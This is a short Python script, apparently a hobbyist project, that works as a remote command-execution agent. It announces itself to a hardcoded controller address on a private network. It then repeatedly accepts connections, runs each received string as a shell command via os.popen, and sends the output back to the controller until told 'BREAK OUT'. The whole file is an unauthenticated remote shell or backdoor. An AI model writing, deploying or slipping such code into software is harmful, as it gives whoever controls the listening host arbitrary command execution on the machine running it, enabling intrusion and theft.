import socket
import os

HOST = '192.168.178.21'
ME = '192.168.178.23'
PORT = 65432
PORT_S = 65434

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("Sending first connection...")
    s.connect((HOST, PORT_S))
    s.sendall(b'Hello, Im there!\nNow RECEAVING...')
except socket.error:
    print("Error sending first connection.")
finally:
    s.close()

while True:
    # RECEAVE
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ME, PORT))
    print("Start Listening")
    s.listen()
    conn, addr = s.accept()
    s.close()

    print('Connected by', addr)
    data = conn.recv(1024)
    if data.decode() == "BREAK OUT":
        print("Breaking out.")
        break
    out = os.popen(data.decode()).read()
    print(data.decode())

    # SEND
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((HOST, PORT_S))
        s.sendall(bytes(out, 'UTF-8'))
    except socket.error:
        print("Error sending data.")
    finally:
        s.close()
